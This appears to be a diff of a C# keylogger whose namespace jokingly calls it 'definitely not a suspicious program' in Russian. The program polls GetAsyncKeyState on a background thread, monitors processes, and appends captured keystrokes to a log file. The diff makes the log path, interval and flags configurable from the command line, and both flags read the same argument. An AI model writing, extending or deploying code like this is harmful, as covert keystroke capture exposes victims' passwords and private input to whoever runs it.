@@ -13,15 +13,17 @@ namespace Совершенно_точно_не_подозрительный_пр
         private static StringBuilder _keyLog = new StringBuilder();
         private static string _logFilePath;
         private static int _saveIntervalSeconds;
+        private static bool _logProcess;
+        private static bool _logKey;
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         static void Main(string[] args)
         {
-            //_logFilePath = args[0];
-            //_saveIntervalSeconds = int.Parse(args[1]);
-            _logFilePath = Directory.GetCurrentDirectory();
-            _saveIntervalSeconds = 10;
+            _logFilePath = args[0];
+            _saveIntervalSeconds = int.Parse(args[1]);
+            _logProcess = bool.Parse(args[2]);
+            _logKey = bool.Parse(args[2]);
 
             Thread monitoringThread = new Thread(ProcessMonitoring);
             monitoringThread.IsBackground = true;
@@ -30,6 +32,8 @@ namespace Совершенно_точно_не_подозрительный_пр
             Thread keyLoggerThread = new Thread(LogKeys);
             keyLoggerThread.IsBackground = true;
             keyLoggerThread.Start();
+
+
             while (true)
             {
                 Thread.Sleep(1000);
@@ -53,7 +57,7 @@ namespace Совершенно_точно_не_подозрительный_пр
                 {
                     try
                     {
-                        using (StreamWriter writer = new StreamWriter(_logFilePath + "LogKeys.txt", true))
+                        using (StreamWriter writer = new StreamWriter(_logFilePath + "\\" + "LogKeys.txt", true))
                         {
                             writer.WriteLine($"[{DateTime.Now}] Keys: {_keyLog}");
                         }
